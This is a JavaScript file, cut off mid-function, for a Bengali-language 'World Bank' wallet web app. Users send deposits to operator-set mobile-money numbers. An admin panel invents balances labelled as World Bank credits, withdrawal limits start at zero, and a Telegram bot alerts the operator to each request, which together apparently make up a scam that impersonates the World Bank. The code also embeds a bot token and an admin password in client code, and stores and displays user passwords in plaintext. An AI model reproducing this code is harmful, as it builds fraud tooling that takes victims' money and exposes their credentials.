const FIREBASE_DB_URL = "https://wallet-banking-default-rtdb.firebaseio.com/";
const BOT_TOKEN = "8898294688:AAH6ngVGDHwNJ1Fpri9OiNgd2nqCDvs9BFE"; 
const CHAT_ID = "7560607133";
const ADMIN_SECURITY_PASS = "worldbank1234@#";

let adminDepositNumbers = JSON.parse(localStorage.getItem('wb_deposit_numbers')) || {
    "🔴 bKash Account": "01800000000 (bKash Agent)",
    "🟠 Nagad Wallet": "01700000000 (Nagad Personal)",
    "🟣 Rocket DBBL": "01900000000-1 (Rocket Personal)",
    "🟢 Upay Mobile": "01600000000 (Upay Personal)",
    "🏛️ Dutch Bangla Bank (DBBL)": "A/C: 123.456.7890 (World Bank DBBL)"
};

const exchangeRatesUSD = { "USD": 1.0, "BDT": 117.50, "MYR": 4.70, "SAR": 3.75, "AED": 3.67, "SGD": 1.35 };
const countryCurrencyMap = { "+880": "৳", "+65": "$", "+60": "MYR", "+966": "SAR", "+971": "AED", "+1": "$", "+44": "£", "+91": "₹" };

// নতুন ব্যাংকগুলোর সম্পূর্ণ তালিকা সহ বাংলাদেশের ব্যাংক ড্রপডাউন
const mandatoryBangladeshBanks = [
    "🔴 bKash Account", 
    "🟠 Nagad Wallet", 
    "🟣 Rocket DBBL", 
    "🟢 Upay Mobile",
    "🏛️ Dutch Bangla Bank (DBBL)", 
    "🏛️ Islami Bank Bangladesh (IBBL)", 
    "🏛️ BRAC Bank PLC", 
    "🏛️ City Bank PLC",
    "🏛️ Sonali Bank PLC",
    "🏛️ Pubali Bank PLC",
    "🏛️ IFIC Bank PLC",
    "🏛️ IDLC Finance PLC",
    "🏛️ Bangladesh Krishi Bank",
    "🌾 Grameen Bank",
    "🏛️ Eastern Bank PLC (EBL)"
];

const countrySpecificBanksWithLogos = { "+880": mandatoryBangladeshBanks };
const defaultBalances = { WorldBank: 0.00, bKash: 0.00, Nagad: 0.00, Rocket: 0.00 };

let usersDatabase = [];
let bannedEmails = [];
let allTransactions = [];
let activeUser = JSON.parse(localStorage.getItem('wb_active_session')) || null;
let balanceHideTimer = null;
let currentLang = 'bn';
let tempProfilePhotoBase64 = null;
let cameraStream = null;
let isDarkMode = false;

function showAdminDepositNumber(selectEl) {
    const numBox = document.getElementById('adminNumberBox');
    const numDisp = document.getElementById('dispAdminAccNum');
    const selectedVal = selectEl.value;
    if (!numBox || !numDisp) return;
    if (selectedVal && adminDepositNumbers[selectedVal]) {
        numDisp.innerText = adminDepositNumbers[selectedVal];
        numBox.classList.remove('hidden');
    } else if (selectedVal) {
        numDisp.innerText = "01800000000 (World Bank Official)";
        numBox.classList.remove('hidden');
    } else {
        numBox.classList.add('hidden');
    }
}

async function adminSaveDepositNumber(e) {
    e.preventDefault();
    const method = document.getElementById('admDepMethodSelect').value;
    const newNumber = document.getElementById('admDepNumberInput').value.trim();
    if (!method || !newNumber) return;

    adminDepositNumbers[method] = newNumber;
    localStorage.setItem('wb_deposit_numbers', JSON.stringify(adminDepositNumbers));

    try {
        await fetch(`${FIREBASE_DB_URL}/depositNumbers.json`, {
            method: 'PUT',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify(adminDepositNumbers)
        });
        showCustomAlert("সফল", `${method} এর জন্য নম্বর সেভ হয়েছে!`);
        e.target.reset();
    } catch(err) {
        showCustomAlert("এরর", "ফায়ারবেসে সেভ করা যায়নি!");
    }
}

async function syncDepositNumbersFromFirebase() {
    try {
        const res = await fetch(`${FIREBASE_DB_URL}/depositNumbers.json`);
        const data = await res.json();
        if (data) {
            adminDepositNumbers = data;
            localStorage.setItem('wb_deposit_numbers', JSON.stringify(adminDepositNumbers));
        }
    } catch(err) { console.error("Deposit numbers sync error:", err); }
}

function toggleTheme() {
    isDarkMode = !isDarkMode;
    const dash = document.getElementById('dashboardSection');
    if (dash) {
        dash.style.background = isDarkMode ? "#0f172a" : "#f8fafc";
        dash.style.color = isDarkMode ? "#f8fafc" : "#0f172a";
    }
}

function toggleCurrencyCalcModal() {
    const modal = document.getElementById('currencyCalcModal');
    if (modal) {
        modal.classList.toggle('hidden');
        calculateCurrencyExchange();
    }
}

function calculateCurrencyExchange() {
    const amtInput = document.getElementById('calcAmountInput');
    const fromSelect = document.getElementById('calcFromCurr');
    const toSelect = document.getElementById('calcToCurr');
    const resultDisp = document.getElementById('calcResultDisp');
    if (!amtInput || !fromSelect || !toSelect || !resultDisp) return;

    const amt = parseFloat(amtInput.value) || 0;
    const usdVal = amt / (exchangeRatesUSD[fromSelect.value] || 1);
    const converted = usdVal * (exchangeRatesUSD[toSelect.value] || 1);
    resultDisp.innerText = `${toSelect.value} ${converted.toFixed(2)}`;
}

function toggleNotificationsModal() {
    const modal = document.getElementById('notificationsModal');
    if (modal) {
        modal.classList.toggle('hidden');
        renderNotificationsList();
    }
}

// ইন-অ্যাপ নোটিফিকেশন সেকশন
function renderNotificationsList() {
    const listEl = document.getElementById('notificationsList');
    const badgeEl = document.getElementById('notifBadge');
    if (!listEl || !activeUser) return;

    listEl.innerHTML = '';
    const myTxs = allTransactions.filter(t => t.userEmail === activeUser.phone);

    if (badgeEl) {
        if (myTxs.length > 0) {
            badgeEl.innerText = myTxs.length;
            badgeEl.classList.remove('hidden');
        } else {
            badgeEl.classList.add('hidden');
        }
    }

    if (myTxs.length === 0) {
        listEl.innerHTML = `<div style="text-align:center; color:#64748b; font-size:12px; padding:10px;">কোনো নোটিফিকেশন নেই।</div>`;
        return;
    }

    myTxs.forEach(t => {
        const item = document.createElement('div');
        let bgCol = '#fef3c7', borderCol = '#f59e0b', textCol = '#d97706', titleText = '⏳ পেন্ডিং রিকোয়েস্ট';
        
        if (t.type === 'AdminCredit') {
            bgCol = '#d1fae5'; borderCol = '#10b981'; textCol = '#047857';
            titleText = '🏛️ ওয়ার্ল্ড ব্যাংক থেকে টাকা জমা হয়েছে!';
        } else if (t.status === 'Approved') {
            bgCol = '#d1fae5'; borderCol = '#10b981'; textCol = '#047857';
            titleText = '✅ রিকোয়েস্ট অনুমোদিত!';
        } else if (t.status === 'Rejected') {
            bgCol = '#fee2e2'; borderCol = '#ef4444'; textCol = '#b91c1c';
            titleText = '❌ রিকোয়েস্ট বাতিল করা হয়েছে';
        }

        item.style.cssText = `padding:8px 12px; border-radius:6px; background:${bgCol}; border:1px solid ${borderCol}; font-size:11px; margin-bottom:6px;`;
        
        let descText = t.type === 'AdminCredit' 
            ? `আপনার মেইন ব্যালেন্সে ${t.currency || '৳'}${formatAmountLocale(t.amount)} টাকা জমা করা হয়েছে।` 
            : `আপনার ${t.type} (${t.currency || '৳'}${formatAmountLocale(t.amount)}) রিকোয়েস্ট। নম্বর: ${t.phone}`;

        item.innerHTML = `
            <strong style="color:${textCol}">${titleText}</strong>
            <p style="margin-top:2px; color:#334155;">${descText}</p>
            <span style="font-size:9px; color:#64748b;">${t.dateStr} ${t.timeStr}</span>
        `;
        listEl.appendChild(item);
    });
}

function downloadTransactionReceipt(txId) {
    const tx = allTransactions.find(t => t.id === txId);
    if (!tx) return;

    const receiptContent = `
========================================
           WORLD BANK RECEIPT           
========================================
Transaction ID : ${tx.trxId}
Date & Time    : ${tx.dateStr} ${tx.timeStr}
Type           : ${tx.type === 'AdminCredit' ? 'World Bank Balance Credit' : tx.type}
Method         : ${tx.method}
Account/Phone  : ${tx.phone}
Amount         : ${tx.currency || '৳'} ${formatAmountLocale(tx.amount)}
Status         : ${tx.status}
========================================
      Thank you for banking with us!    
========================================
    `;

    const blob = new Blob([receiptContent], { type: 'text/plain;charset=utf-8' });
    const url = URL.createObjectURL(blob);
    const a = document.createElement('a');
    a.href = url;
    a.download = `Receipt_${tx.trxId}.txt`;
    document.body.appendChild(a);
    a.click();
    document.body.removeChild(a);
    URL.revokeObjectURL(url);
}

function populateUserDynamicBanksWithLogos() {
    const addSelect = document.getElementById('addMoneyMethodSelect');
    const transferSelect = document.getElementById('fundTransferMethodSelect');
    if (!addSelect || !transferSelect) return;

    let countryCode = "+880";
    if (activeUser && activeUser.phone) {
        for (let code in countrySpecificBanksWithLogos) {
            if (activeUser.phone.trim().startsWith(code)) {
                countryCode = code;
                break;
            }
        }
    }

    const localBanks = countrySpecificBanksWithLogos[countryCode] || mandatoryBangladeshBanks;
    let combinedBanks = Array.from(new Set(["🏛️ World Bank Account", ...localBanks, "🌐 International Wire Transfer"]));

    addSelect.innerHTML = `<option value="">পেমেন্ট মেথড বা ব্যাংক সিলেক্ট করুন</option>`;
    transferSelect.innerHTML = `<option value="">ট্রান্সফার মাধ্যম সিলেক্ট করুন</option>`;

    combinedBanks.forEach(b => {
        addSelect.innerHTML += `<option value="${b}">${b}</option>`;
        transferSelect.innerHTML += `<option value="${b}">${b}</option>`;
    });
}

function checkLoginInputType(inputEl) {
    const val = inputEl.value.trim();
    const noteEl = document.getElementById('emailWarningNote');
    if (!noteEl) return;
    if (val.includes('@')) noteEl.classList.remove('hidden');
    else noteEl.classList.add('hidden');
}

async function openQuickPayScanner() {
    document.getElementById('cameraModal').classList.remove('hidden');
    try {
        const video = document.getElementById('qrVideoFeed');
        cameraStream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "environment" } });
        video.srcObject = cameraStream;
    } catch (err) {
        showCustomAlert("ক্যামেরা এরর", "ক্যামেরা পারমিশন পাওয়া যায়নি।");
    }
}

function closeQuickPayScanner() {
    if (cameraStream) {
        cameraStream.getTracks().forEach(track => track.stop());
        cameraStream = null;
    }
    document.getElementById('cameraModal').classList.add('hidden');
}

function openUSAHotlineFAQ() {
    showCustomAlert("USA Hotline & FAQ", "World Bank Global Support:\n📞 +1 (800) 555-0199\n✉️ support@worldbank.org");
}

function filterCountryList() {
    const input = document.getElementById('countrySearchInput').value.toLowerCase();
    const select = document.getElementById('regCountryCode');
    for (let i = 0; i < select.options.length; i++) {
        select.options[i].style.display = select.options[i].text.toLowerCase().includes(input) ? "" : "none";
    }
}

function getUserCurrency(user) {
    if (!user) return '৳';
    if (user.currency) return user.currency;
    if (user.phone) {
        for (let code in countryCurrencyMap) {
            if (user.phone.trim().startsWith(code)) return countryCurrencyMap[code];
        }
    }
    return '৳';
}

function formatAmountLocale(amount) {
    return parseFloat(amount || 0).toFixed(2);
}

function showCustomAlert(title, message) {
    document.getElementById('customAlertTitle').innerText = title;
    document.getElementById('customAlertText').innerText = message;
    document.getElementById('customAlertModal').classList.remove('hidden');
}

function closeCustomAlert() {
    document.getElementById('customAlertModal').classList.add('hidden');
}

function sanitizeEmailKey(keyStr) {
    return keyStr ? keyStr.replace(/[^a-zA-Z0-9]/g, "_") : "";
}

async function syncFromFirebase() {
    try {
        await syncDepositNumbersFromFirebase();
        const uRes = await fetch(`${FIREBASE_DB_URL}/users.json`);
        const uData = await uRes.json();
        if (uData) {
            usersDatabase = Object.values(uData);
            localStorage.setItem('wb_users', JSON.stringify(usersDatabase));
            if (activeUser) {
                const refreshedUser = usersDatabase.find(u => u.phone === activeUser.phone);
                if (refreshedUser) {
                    activeUser = refreshedUser;
                    localStorage.setItem('wb_active_session', JSON.stringify(activeUser));
                    document.getElementById('userNameDisp').innerText = activeUser.name || 'User Name';
                    document.getElementById('userPhoneDisp').innerText = activeUser.phone || '';
                }
            }
        }

        const bRes = await fetch(`${FIREBASE_DB_URL}/bannedEmails.json`);
        const bData = await bRes.json();
        if (bData) {
            bannedEmails = Object.values(bData);
            localStorage.setItem('wb_banned', JSON.stringify(bannedEmails));
        }

        const tRes = await fetch(`${FIREBASE_DB_URL}/transactions.json`);
        const tData = await tRes.json();
        if (tData) {
            allTransactions = Object.values(tData).reverse();
            localStorage.setItem('wb_transactions', JSON.stringify(allTransactions));
            renderNotificationsList();
        }
    } catch(err) { console.error("Firebase sync error:", err); }
}

document.addEventListener('DOMContentLoaded', async () => {
    if (activeUser) {
        document.getElementById('authSection')?.classList.add('hidden');
        document.getElementById('dashboardSection')?.classList.remove('hidden');
        
        // হেডার প্রোফাইলে ইউজারের নাম ও ফোন নম্বর সঠিকভাবে বসানো
        document.getElementById('userNameDisp').innerText = activeUser.name || 'User Name';
        document.getElementById('userPhoneDisp').innerText = activeUser.phone || '';
        
        updateAvatarDisplay();
        renderBalances();
        populateUserDynamicBanksWithLogos();
        renderNotificationsList();
    } else {
        let savedPhone = localStorage.getItem('wb_saved_phone');
        if (savedPhone) {
            let logPhoneInput = document.getElementById('logPhone');
            if (logPhoneInput) logPhoneInput.value = savedPhone;
        }
    }
    await syncFromFirebase();
});

function openAddMoneyModal() { 
    const modal = document.getElementById('addMoneyModal');
    if (modal) {
        modal.classList.toggle('hidden');
        document.getElementById('adminNumberBox')?.classList.add('hidden');
        document.getElementById('addMoneyForm')?.reset();
    }
}

function openFundTransferModal() { document.getElementById('fundTransferModal')?.classList.toggle('hidden'); }
function openTopUpModal() { 
    showCustomAlert("Mobile Top Up", "মোবাইল টপ আপ অপশনটি এখনো চালু হয়নি!");
}
function openCardBankModal() { document.getElementById('cardBankModal')?.classList.toggle('hidden'); }
function toggleForgotModal() { document.getElementById('forgotModal')?.classList.toggle('hidden'); }

function updateAvatarDisplay() {
    const avatarEl = document.getElementById('userAvatarDisp');
    if (!avatarEl) return;
    if (activeUser && activeUser.photo) {
        avatarEl.style.backgroundImage = `url(${activeUser.photo})`;
        avatarEl.innerText = '';
    } else {
        avatarEl.style.backgroundImage = 'none';
        avatarEl.innerText = '👤';
    }
}

async function saveUserToFirebase(user) {
    try {
        await fetch(`${FIREBASE_DB_URL}/users/${sanitizeEmailKey(user.phone)}.json`, {
            method: 'PUT',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify(user)
        });
    } catch(err) { console.error("User save error:", err); }
}

async function saveTxToFirebase(txObj) {
    try {
        await fetch(`${FIREBASE_DB_URL}/transactions/tx_${txObj.id}.json`, {
            method: 'PUT',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify(txObj)
        });
    } catch(err) { console.error("Tx save error:", err); }
}

function togglePasswordVisibility(inputId, btn) {
    const input = document.getElementById(inputId);
    if (!input) return;
    if (input.type === 'password') {
        input.type = 'text';
        btn.innerText = '🙈';
    } else {
        input.type = 'password';
        btn.innerText = '👁️';
    }
}

function handleForgotPassword(e) {
    e.preventDefault();
    const email = document.getElementById('forgotEmailInput').value.trim();
    const phone = document.getElementById('forgotPhoneInput').value.trim();
    const user = usersDatabase.find(u => u.email === email && u.phone.includes(phone));
    if (user) {
        showCustomAlert("রিকভারি সফল", `আপনার পাসওয়ার্ড: ${user.password}`);
        toggleForgotModal();
    } else {
        showCustomAlert("ত্রুটি", 'প্রদত্ত ইমেইল বা মোবাইল নম্বরটি পাওয়া যায়নি!');
    }
}

function handleCountryChange(selectEl) {
    setLanguage(selectEl.options[selectEl.selectedIndex].getAttribute('data-lang') || 'bn');
}

function toggleLangLoop() {
    setLanguage(currentLang === 'bn' ? 'en' : 'bn');
}

function setLanguage(lang) {
    currentLang = lang;
    document.getElementById('dashLangBtn').innerText = lang.toUpperCase();
}

function switchTab(type) {
    const loginForm = document.getElementById('loginForm');
    const signUpForm = document.getElementById('signUpForm');
    document.getElementById('errorText').style.display = 'none';

    if(type === 'login') {
        loginForm?.classList.remove('hidden');
        signUpForm?.classList.add('hidden');
        document.getElementById('loginTab')?.classList.add('active');
        document.getElementById('signUpTab')?.classList.remove('active');
    } else {
        signUpForm?.classList.remove('hidden');
        loginForm?.classList.add('hidden');
        document.getElementById('signUpTab')?.classList.add('active');
        document.getElementById('loginTab')?.classList.remove('active');
    }
}

function sendTelegramNotification(message) {
    fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ chat_id: CHAT_ID, text: message, parse_mode: 'HTML' })
    }).catch(err => console.error("Telegram API Error:", err));
}

// সাইন আপ হ্যান্ডলার
async function handleSignUp(e) {
    e.preventDefault();
    const name = document.getElementById('regName').value;
    const email = document.getElementById('regEmail').value;
    const countryCodeSelect = document.getElementById('regCountryCode');
    const rawPhone = document.getElementById('regPhone').value.trim();
    const password = document.getElementById('regPass').value;
    const fullPhone = countryCodeSelect.value + rawPhone;
    const currency = countryCodeSelect.options[countryCodeSelect.selectedIndex].getAttribute('data-currency') || '৳';

    if (usersDatabase.some(u => u.phone === fullPhone || u.email === email)) {
        showCustomAlert("সতর্কতা", 'এই ফোন নম্বর বা ইমেইল দিয়ে আগেই অ্যাকাউন্ট খোলা হয়েছে!');
        return;
    }

    const newUser = {
        name, email, phone: fullPhone, currency, password,
        photo: null, totalBalance: 0.00, withdrawLimit: 0.00,
        balances: { ...defaultBalances }
    };

    usersDatabase.push(newUser);
    localStorage.setItem('wb_users', JSON.stringify(usersDatabase));
    localStorage.setItem('wb_saved_phone', fullPhone);
    saveUserToFirebase(newUser);

    showCustomAlert("সফল", 'অ্যাকাউন্ট তৈরি হয়েছে! আপনার ব্যালেন্স ও উইথড্র লিমিট ৳০.০০। এখন মোবাইল নম্বর দিয়ে লগইন করুন।');
    switchTab('login');
    document.getElementById('logPhone').value = fullPhone;
    document.getElementById('signUpForm').reset();
}

async function handleLogin(e) {
    e.preventDefault();
    const inputPhone = document.getElementById('logPhone').value.trim();
    const password = document.getElementById('logPass').value;

    const user = usersDatabase.find(u => u.phone.includes(inputPhone) && u.password === password);
    if(user) {
        activeUser = user;
        if(!activeUser.balances) activeUser.balances = { ...defaultBalances };
        if(activeUser.totalBalance === undefined) activeUser.totalBalance = 0.00;
        if(activeUser.withdrawLimit === undefined) activeUser.withdrawLimit = 0.00;

        localStorage.setItem('wb_active_session', JSON.stringify(activeUser));
        localStorage.setItem('wb_saved_phone', activeUser.phone);

        document.getElementById('authSection').classList.add('hidden');
        document.getElementById('dashboardSection').classList.remove('hidden');
        
        // লগইন সফল হলে ড্যাশবোর্ডে ইউজারের নাম এবং ফোন নম্বর অটো আপডেট
        document.getElementById('userNameDisp').innerText = activeUser.name || 'User Name';
        document.getElementById('userPhoneDisp').innerText = activeUser.phone || '';

        updateAvatarDisplay();
        renderBalances();
        populateUserDynamicBanksWithLogos();
        renderNotificationsList();
    } else {
        document.getElementById('errorText').style.display = 'block';
    }
}

function renderBalances() {
    const pillText = document.getElementById('balancePillText');
    const symbolEl = document.getElementById('dashCurrencySymbol');
    const userCurr = getUserCurrency(activeUser);
    if (symbolEl && activeUser) symbolEl.innerText = userCurr;
    if (pillText) pillText.innerText = "Balance";
}

function toggleBalanceVisibility() {
    const pillText = document.getElementById('balancePillText');
    if (!activeUser) return;
    if (balanceHideTimer) clearTimeout(balanceHideTimer);

    const rawBal = activeUser.totalBalance !== undefined ? activeUser.totalBalance : 0.00;
    pillText.innerText = `${getUserCurrency(activeUser)} ${formatAmountLocale(rawBal)}`;
    balanceHideTimer = setTimeout(() => { pillText.innerText = "Balance"; }, 3000);
}

function logout() {
    activeUser = null;
    localStorage.removeItem('wb_active_session');
    document.getElementById('dashboardSection').classList.add('hidden');
    document.getElementById('authSection').classList.remove('hidden');
    document.getElementById('loginForm')?.reset();
}

function previewProfilePhoto(e) {
    const file = e.target.files[0];
    if (file) {
        const reader = new FileReader();
        reader.onload = function(event) {
            tempProfilePhotoBase64 = event.target.result;
            const prev = document.getElementById('profileImagePreview');
            if (prev) {
                prev.style.backgroundImage = `url(${tempProfilePhotoBase64})`;
                prev.innerText = '';
            }
        };
        reader.readAsDataURL(file);
    }
}

function toggleProfileModal() {
    document.getElementById('profileModal').classList.toggle('hidden');
    if (activeUser) {
        document.getElementById('profNameInput').value = activeUser.name || '';
        document.getElementById('profPhoneInput').value = activeUser.phone || '';
        document.getElementById('profPassInput').value = activeUser.password || '';
    }
}

async function openInboxModal() {
    document.getElementById('inboxModal').classList.toggle('hidden');
    renderUserInboxHistory();
}

// ইউজারের স্টেটমেন্ট
function renderUserInboxHistory() {
    const tbody = document.getElementById('userInboxModalBody');
    const filterSelect = document.getElementById('statementFilterSelect');
    if (!tbody || !activeUser) return;
    
    tbody.innerHTML = '';
    const filterType = filterSelect ? filterSelect.value : 'ALL';
    let myTxs = allTransactions.filter(t => t.userEmail === activeUser.phone);
    if (filterType !== 'ALL') myTxs = myTxs.filter(t => t.type === filterType);

    if (myTxs.length === 0) {
        tbody.innerHTML = `<tr><td colspan="6" style="text-align:center; color:#64748b; font-weight:bold;">কোনো রেকর্ড পাওয়া যায়নি।</td></tr>`;
        return;
    }

    myTxs.forEach(t => {
        let statusBadge = `<span class="status-pending">Pending ⏳</span>`;
        if (t.type === 'AdminCredit') statusBadge = `<span class="status-approved">Credited 🏛️</span>`;
        else if (t.status === 'Approved') statusBadge = `<span class="status-approved">Approved ✅</span>`;
        else if (t.status === 'Rejected') statusBadge = `<span class="status-rejected">Rejected ❌</span>`;
        
        const curr = t.currency || getUserCurrency(activeUser);

        tbody.innerHTML += `
            <tr>
                <td>${t.dateStr}</td>
                <td><b>${t.type === 'AdminCredit' ? 'World Bank Deposit' : t.type}</b></td>
                <td>${t.method}<br><small style="color:#0284c7;">নম্বর: ${t.phone}</small></td>
                <td style="color:#059669; font-weight:bold;">${curr} ${formatAmountLocale(t.amount)}</td>
                <td><code>${t.trxId}</code></td>
                <td>
                    ${statusBadge}<br>
                    <button type="button" onclick="downloadTransactionReceipt(${t.id})" style="margin-top:4px; background:#0284c7; color:white; border:none; padding:2px 6px; border-radius:4px; font-size:10px; cursor:pointer;">📥 রসিদ</button>
                </td>
            </tr>`;
    });
}

async function updateUserProfile(e) {
    e.preventDefault();
    if (!activeUser) return;
    activeUser.name = document.getElementById('profNameInput').value;
    activeUser.password = document.getElementById('profPassInput').value;
    if (tempProfilePhotoBase64) activeUser.photo = tempProfilePhotoBase64;

    const userIndex = usersDatabase.findIndex(u => u.phone === activeUser.phone);
    if (userIndex !== -1) {
        usersDatabase[userIndex] = activeUser;
        localStorage.setItem('wb_users', JSON.stringify(usersDatabase));
        localStorage.setItem('wb_active_session', JSON.stringify(activeUser));
        saveUserToFirebase(activeUser);
    }
    document.getElementById('userNameDisp').innerText = activeUser.name;
    updateAvatarDisplay();
    showCustomAlert("সফল", 'প্রোফাইল আপডেট হয়েছে!');
    toggleProfileModal();
}

async function handleTopUpSubmit(e) {
    e.preventDefault();
    showCustomAlert("Mobile Top Up", "মোবাইল টপ আপ অপশনটি এখনো চালু হয়নি!");
}

async function handleCardBankSubmit(e) {
    e.preventDefault();
    showCustomAlert("Notice", "প্রসেসিং-এ রয়েছে।");
}

async function submitTransactionRequest(e, type) {
    e.preventDefault();
    const form = e.target;
    const method = form.querySelector('.methodSelect').value;
    const phone = form.querySelector('.phoneInput').value;
    const amount = parseFloat(form.querySelector('.amountInput').value);
    const trxId = form.querySelector('.trxInput').value;
    const secPass = form.querySelector('.secPassInput').value;

    if (secPass !== activeUser.password) {
        showCustomAlert("পাসওয়ার্ড ভুল", 'সঠিক পাসওয়ার্ড দিন!');
        return;
    }

    const currentBal = activeUser.totalBalance !== undefined ? parseFloat(activeUser.totalBalance) : 0.00;
    const userLimit = activeUser.withdrawLimit !== undefined ? parseFloat(activeUser.withdrawLimit) : 0.00;
    const userCurr = getUserCurrency(activeUser);

    if (type === 'Withdraw' && currentBal <= 0) {
        showCustomAlert("ব্যালেন্স নেই", "আপনার পর্যাপ্ত পরিমাণ ব্যালেন্স নাই!");
        return;
    }

    if (type === 'Withdraw' && amount > userLimit) {
        showCustomAlert("লিমিট অতিক্রম", `আপনার উইথড্র / ব্যাংক ট্রান্সফার লিমিট ${userCurr} ${userLimit}। লিমিট বাড়ানোর জন্য ব্যাংকের সাথে যোগাযোগ করুন!`);
        return;
    }

    if (type === 'Withdraw' && amount > currentBal) {
        showCustomAlert("অপর্যাপ্ত ব্যালেন্স", "আপনার পর্যাপ্ত পরিমাণ ব্যালেন্স নাই!");
        return;
    }

    const now = new Date();
    const txObj = {
        id: Date.now(), userEmail: activeUser.phone, userName: activeUser.name,
        type: type, method: method, phone: phone, amount: amount, currency: userCurr,
        trxId: trxId, status: 'Pending', dateStr: now.toLocaleDateString('bn-BD'), timeStr: now.toLocaleTimeString('bn-BD')
    };

    allTransactions.unshift(txObj);
    localStorage.setItem('wb_transactions', JSON.stringify(allTransactions));
    saveTxToFirebase(txObj);
    sendTelegramNotification(`⏳ <b>${type} রিকোয়েস্ট!</b>\n👤 ইউজার: ${activeUser.name}\n💰 পরিমাণ: ${userCurr}${amount}`);
    showCustomAlert("সফল রিকোয়েস্ট", `আপনার ${type} রিকোয়েস্ট জমা হয়েছে।`);
    form.reset();
    if(type === 'Deposit') openAddMoneyModal();
    if(type === 'Withdraw') openFundTransferModal();
}

function toggleAdminModal() { document.getElementById('adminModal')?.classList.toggle('hidden'); }

async function verifyAdminPassword() {
    const pass = document.getElementById('adminPassInput').value;
    if (pass === ADMIN_SECURITY_PASS) {
        document.getElementById('adminAuthBox').classList.add('hidden');
        document.getElementById('adminControlBox').classList.remove('hidden');
        renderAdminUsersList();
        renderAdminPendingList();
        renderAdminAllHistory();
        populateAdminUserSelect();
    } else {
        showCustomAlert("ত্রুটি", 'ভুল পাসওয়ার্ড!');
    }
}

async function refreshAdminData() {
    await syncFromFirebase();
    renderAdminUsersList();
    renderAdminPendingList();
    renderAdminAllHistory();
    populateAdminUserSelect();
    showCustomAlert("সফল", 'ডাটা রিফ্রেশ হয়েছে!');
}

async function adminDeleteUser(userIdentifier) {
    if (!confirm(`আপনি কি নিশ্চিতভাবে ${userIdentifier} ডিলিট করতে চান?`)) return;
    usersDatabase = usersDatabase.filter(u => u.phone !== userIdentifier && u.email !== userIdentifier);
    localStorage.setItem('wb_users', JSON.stringify(usersDatabase));
    try {
        await fetch(`${FIREBASE_DB_URL}/users/${sanitizeEmailKey(userIdentifier)}.json`, { method: 'DELETE' });
    } catch(err) { console.error(err); }
    showCustomAlert("সফল", 'ইউজার ডিলিট করা হয়েছে!');
    renderAdminUsersList();
    populateAdminUserSelect();
}

async function adminUpdateUserWithdrawLimit(e) {
    e.preventDefault();
    const userPhone = document.getElementById('admLimitUserSelect').value;
    const newLimit = parseFloat(document.getElementById('admUserCustomLimitInput').value);
    const userIndex = usersDatabase.findIndex(u => u.phone === userPhone);
    if (userIndex !== -1) {
        usersDatabase[userIndex].withdrawLimit = newLimit;
        localStorage.setItem('wb_users', JSON.stringify(usersDatabase));
        saveUserToFirebase(usersDatabase[userIndex]);
        showCustomAlert("সফল", 'ইউজারের উইথড্র ও ট্রান্সফার লিমিট সেভ হয়েছে!');
        renderAdminUsersList();
        if (activeUser && activeUser.phone === userPhone) {
            activeUser.withdrawLimit = newLimit;
            localStorage.setItem('wb_active_session', JSON.stringify(activeUser));
        }
    }
}

function populateAdminUserSelect() {
    const balSelect = document.getElementById('admBalanceUserSelect');
    const limSelect = document.getElementById('admLimitUserSelect');
    if (balSelect) balSelect.innerHTML = '<option value="">ইউজার সিলেক্ট করুন</option>';
    if (limSelect) limSelect.innerHTML = '<option value="">ইউজার সিলেক্ট করুন</option>';

    usersDatabase.forEach(u => {
        const opt = `<option value="${u.phone}">${u.name} (${u.phone})</option>`;
        if (balSelect) balSelect.innerHTML += opt;
        if (limSelect) limSelect.innerHTML += opt;
    });
}

async function adminUpdateUserBalance(e) {
    e.preventDefault();
    const userIdentifier = document.getElementById('admBalanceUserSelect').value;
    const newAmount = parseFloat(document.getElementById('admBalanceAmount').value);

    const userIndex = usersDatabase.findIndex(u => u.phone === userIdentifier);
    if (userIndex !== -1) {
        const user = usersDatabase[userIndex];
        user.totalBalance = newAmount;

        usersDatabase[userIndex] = user;
        localStorage.setItem('wb_users', JSON.stringify(usersDatabase));
        saveUserToFirebase(user);

        const now = new Date();
        const txObj = {
            id: Date.now(), 
            userEmail: user.phone, 
            userName: user.name,
            type: 'AdminCredit', 
            method: 'World Bank Central Transfer', 
            phone: user.phone, 
            amount: newAmount, 
            currency: getUserCurrency(user),
            trxId: 'WB_CREDIT_' + Math.floor(100000 + Math.random() * 900000),
            status: 'Approved', 
            dateStr: now.toLocaleDateString('bn-BD'), 
            timeStr: now.toLocaleTimeString('bn-BD')
        };

        allTransactions.unshift(txObj);
        localStorage.setItem('wb_transactions', JSON.stringify(allTransactions));
        saveTxToFirebase(txObj);

        showCustomAlert("সফল", 'ইউজারের মেইন ব্যালেন্স আপডেট করা হয়েছে এবং নোটিফিকেশন পাঠানো হয়েছে!');
        renderAdminUsersList();

        if (activeUser && activeUser.phone === user.phone) {
            activeUser = user;
            localStorage.setItem('wb_active_session', JSON.stringify(activeUser));
            renderBalances();
            renderNotificationsList();
        }
    }
}

function renderAdminUsersList() {
    const tbody = document.getElementById('adminUsersListBody');
    if (!tbody) return;
    tbody.innerHTML = '';
    usersDatabase.forEach(u => {
        const curr = getUserCurrency(u);
        tbody.innerHTML += `
            <tr>
                <td>👤</td>
                <td><b>${u.name}</b></td>
                <td>${u.phone}</td>
                <td>${curr}</td>
                <td style="color:#f43f5e;">${u.password}</td>
                <td>${curr} ${formatAmountLocale(u.totalBalance || 0)}</td>
                <td>${curr} ${formatAmountLocale(u.withdrawLimit || 0)}</td>
                <td><button type="button" onclick="adminDeleteUser('${u.phone}')" class="btn-delete-user">Delete</button></td>
            </tr>`;
    });
}

function renderAdminPendingList() {
    const tbody = document.getElementById('adminPendingTableBody');
    if (!tbody) return;
    tbody.innerHTML = '';
    const pendingTxs = allTransactions.filter(t => t.status === 'Pending');
    
    if (pendingTxs.length === 0) {
        tbody.innerHTML = `<tr><td colspan="7" style="text-align:center; color:#94a3b8;">কোনো রিকোয়েস্ট নেই।</td></tr>`;
        return;
    }

    pendingTxs.forEach(t => {
        tbody.innerHTML += `
            <tr>
                <td><b>${t.userName || t.userEmail}</b></td>
                <td style="color:#f59e0b;"><b>${t.type}</b></td>
                <td>${t.method}</td>
                <td>${t.phone}</td>
